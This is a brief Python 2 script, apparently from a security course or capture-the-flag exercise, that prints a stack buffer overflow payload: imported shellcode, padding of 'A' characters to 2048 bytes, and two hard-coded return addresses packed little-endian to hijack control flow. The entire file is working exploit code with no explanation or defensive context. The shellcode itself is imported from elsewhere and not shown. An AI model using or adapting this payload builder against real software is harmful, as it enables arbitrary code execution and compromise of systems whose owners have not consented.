#!/usr/bin/python
from struct import pack
from shellcode import shellcode

toReturnSC = 0xbffe7408
toReturn=0xbffe7c1c
#print shellcode
print shellcode + "A"*(2048 - len(shellcode) ) + pack("<I", toReturnSC) + pack("<I", toReturn)

